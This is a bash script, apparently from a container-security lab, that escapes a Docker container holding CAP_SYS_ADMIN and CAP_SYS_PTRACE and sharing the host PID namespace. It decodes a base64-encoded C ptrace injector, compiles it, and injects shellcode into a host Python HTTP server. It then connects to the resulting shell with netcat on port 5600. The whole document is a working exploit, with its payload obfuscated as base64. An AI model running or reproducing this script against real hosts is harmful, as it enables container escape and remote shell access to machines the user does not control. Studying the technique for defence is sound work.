#!/bin/bash

# This is the code for the HTTP Process Injection exploit.
# Here I exploit two capabilities that are CAP_SYS_ADMIN and CAP_SYS_PTRACE
# as long as a PID namespace that is shared with the PID host namespace. 
# The two capabilities gives to the user of the container the capability of
# manipulating registries of a specific process. Hence, once we have found
# the interested process, that in this case is a Python http server listening
# on the port 80, we can easily inject a shellcode using the ptrace utility.
# This shellcode will be a revershell directed to the container. 
# 
# Shellcode: https://www.exploit-db.com/exploits/41128

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

function check_command_output
{
	if [ ! $? -eq 0 ]; then
		echo -e "[*] ${RED}Error. Exiting ...${NC}"
		exit 1
	fi;
}

echo -e "[*] ${GREEN}Installing the following packages"
echo -e "    + libcap2/libcap2-bin (for the capsh tool)"
echo -e "    + build-essential (for missing default tools)"
echo -e "    + netcat (for open ports)"
echo -e "    + net-tools (for get network configurations)${NC}"

apt update && apt install -y build-essential netcat net-tools libcap2-bin

echo -e "[*] ${GREEN}Check for the CAP_SYS_ADMIN and CAP_SYS_PTRACE availability${NC}"
capsys=$(capsh --print | grep -E '[^!]cap_sys_admin')
capptr=$(capsh --print | grep -E '[^!]cap_sys_ptrace')
if [[ ! -z ${capsys} && ! -z ${capptr} ]]; then
	echo -e "[*] ${GREEN}CAP_SYS_ADMIN capability found${NC}"
	echo -e "[*] ${GREEN}CAP_SYS_PTRACE capability found${NC}"
else
	echo -e "[*] ${RED}CAP_SYS_ADMIN capability not found. Impossibility to continue.${NC}"
        echo -e "[*] ${RED}CAP_SYS_PTRACE capability not found. Impossibility to continue.${NC}"
        echo -e "[*] ${RED}Exiting ...${NC}"
        exit 1
fi;

echo -e "[*] ${GREEN}Creation the C source file for Process Injection${NC}"

# This is the base64 representation of the inject.c file
file=$( printf '%s' "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3"\
     "RkaW50Lmg+CgojaW5jbHVkZSA8c3lzL3B0cmFjZS5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNpbmNsdWRlIDxzeXMv"\
     "d2FpdC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CgojaW5jbHVkZSA8c3lzL3VzZXIuaD4KI2luY2x1ZGUgPHN5cy9yZWcuaD"\
     "4KCiNkZWZpbmUgU0hFTExDT0RFX1NJWkUgODcKCnVuc2lnbmVkIGNoYXIgKnNoZWxsY29kZSA9IAogICAgIlx4NDhceDMx"\
     "XHhjMFx4NDhceDMxXHhkMlx4NDhceDMxXHhmNlx4ZmZceGM2XHg2YSIKICAgICJceDI5XHg1OFx4NmFceDAyXHg1Zlx4MG"\
     "ZceDA1XHg0OFx4OTdceDZhXHgwMlx4NjYiCiAgICAiXHhjN1x4NDRceDI0XHgwMlx4MTVceGUwXHg1NFx4NWVceDUyXHg2"\
     "YVx4MzFceDU4IgogICAgIlx4NmFceDEwXHg1YVx4MGZceDA1XHg1ZVx4NmFceDMyXHg1OFx4MGZceDA1XHg2YSIKICAgIC"\
     "JceDJiXHg1OFx4MGZceDA1XHg0OFx4OTdceDZhXHgwM1x4NWVceGZmXHhjZVx4YjAiCiAgICAiXHgyMVx4MGZceDA1XHg3"\
     "NVx4ZjhceGY3XHhlNlx4NTJceDQ4XHhiYlx4MmZceDYyIgogICAgIlx4NjlceDZlXHgyZlx4MmZceDczXHg2OFx4NTNceD"\
     "Q4XHg4ZFx4M2NceDI0XHhiMCIKICAgICJceDNiXHgwZlx4MDUiOwoKaW50IGluamVjdF9kYXRhKHBpZF90IHBpZCwgdW5z"\
     "aWduZWQgY2hhciAqc3JjLCB2b2lkICpkc3QsIGludCBsZW4pIHsKICAgIGludCBpOwogICAgdWludDMyX3QgKnMgPSAodW"\
     "ludDMyX3QgKikgc3JjOwogICAgdWludDMyX3QgKmQgPSAodWludDMyX3QgKikgZHN0OwoKICAgIGZvciAoaSA9IDA7IGkg"\
     "PCBsZW47IGkgKz0gNCwgcysrLCBkKyspIHsKICAgICAgICBpZiAoKHB0cmFjZShQVFJBQ0VfUE9LRVRFWFQsIHBpZCwgZC"\
     "wgKnMpKSA8IDApIHsKICAgICAgICAgICAgcGVycm9yKCJwdHJhY2UoUE9LRVRFWFQpOiIpOwogICAgICAgICAgICByZXR1"\
     "cm4gLTE7CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAwOwp9CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndl"\
     "tdKSB7CiAgICBwaWRfdCB0YXJnZXQ7CiAgICBzdHJ1Y3QgdXNlcl9yZWdzX3N0cnVjdCByZWdzOwogICAgaW50IHN5c2Nh"\
     "bGw7CiAgICBsb25nIGRzdDsKCiAgICBpZiAoYXJnYyAhPSAyKSB7CiAgICAgICAgZnByaW50ZihzdGRlcnIsICJVc2FnZT"\
     "pcblx0JXMgcGlkXG4iLCBhcmd2WzBdKTsKICAgICAgICBleGl0KDEpOwogICAgfQoKICAgIHRhcmdldCA9IGF0b2koYXJn"\
     "dlsxXSk7IC8vIEdldCB0aGUgcHJvY2VzcyBJZAogICAgcHJpbnRmKCIrIFRyYWNpbmcgcHJvY2VzcyAlZFxuIiwgdGFyZ2"\
     "V0KTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9BVFRBQ0gsIHRhcmdldCwgTlVMTCwgTlVMTCkpIDwgMCkgewogICAgICAg"\
     "IHBlcnJvcigicHRyYWNlIChBVFRBQ0gpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgcHJpbnRmKCIrIFdhaX"\
     "RpbmcgZm9yIHByb2Nlc3MgLi4uIFxuIik7CiAgICB3YWl0KE5VTEwpOwoKICAgIHByaW50ZigiKyBHZXR0aW5nIFJlZ2lz"\
     "dGVycyAuLi4gXG4iKTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9HRVRSRUdTLCB0YXJnZXQsIE5VTEwsICZyZWdzKSkgPC"\
     "AwKSB7CiAgICAgICAgcGVycm9yKCJwdHJhY2UgKEdFVFJFR1MpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAg"\
     "cHJpbnRmKCIrIEluamVjdGluZyBzaGVsbCBjb2RlIGF0ICVwXG4iLCAodm9pZCopcmVncy5yaXApOwogICAgaW5qZWN0X2"\
     "RhdGEodGFyZ2V0LCBzaGVsbGNvZGUsICh2b2lkKilyZWdzLnJpcCwgU0hFTExDT0RFX1NJWkUpOwogICAgcmVncy5yaXAg"\
     "Kz0gMjsKCiAgICBwcmludGYoIisgU2V0dGluZyBpbnN0cnVjdGlvbiBwb2ludGVyIHRvICVwXG4iLCAodm9pZCAqKXJlZ3"\
     "MucmlwKTsKICAgIGlmICgocHRyYWNlKFBUUkFDRV9TRVRSRUdTLCB0YXJnZXQsIE5VTEwsICZyZWdzKSkgPCAwKSB7CiAg"\
     "ICAgICAgcGVycm9yKCJwdHJhY2UoR0VUUkVHUyk6Iik7CiAgICAgICAgZXhpdCgxKTsKICAgIH0KICAgIHByaW50ZigiKy"\
     "BSdW4gSXQhXG4iKTsKCiAgICBpZiAoKHB0cmFjZShQVFJBQ0VfREVUQUNILCB0YXJnZXQsIE5VTEwsIE5VTEwpKSA8IDAp"\
     "IHsKICAgICAgICBwZXJyb3IoInB0cmFjZShERVRBQ0gpOiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgcmV0dX"\
     "JuIDA7Cn0=")

echo ${file} | base64 -d >> inject.c

test ! -z $(find . -name inject.c) && echo -e "[*] ${GREEN}File Created${NC}" || (
	echo -e "[*] ${RED}File doesn't exists. Exiting ...${NC}" && exit 1
)

echo -e "[*] ${GREEN}Compiling the source code${NC}"
gcc inject.c -o inject

echo -e "[*] ${GREEN}Listing all the PIDs of processes of the host machine${NC}"
ps -eaf | grep python  # Get the PID of the python process (the PID is the same of the host)
echo -e "[*] ${YELLOW}Type the PID of the HTTP server: ${NC}"
read pidproc

echo -e "[*] ${GREEN}Injecting the SHELLCODE${NC}"
./inject ${pidproc}
check_command_output

echo -e "[*] ${GREEN}Listing the network configuration of the container${NC}"
ifconfig  # Get the IP of the container and the Gateway
echo -e "[*] ${YELLOW}Type the IP or the container (usually 172.17.0.X): ${NC}"
read ip

echo -e "${GREEN}[*] Connecting with the host machine${NC}"
nc ${ip} 5600
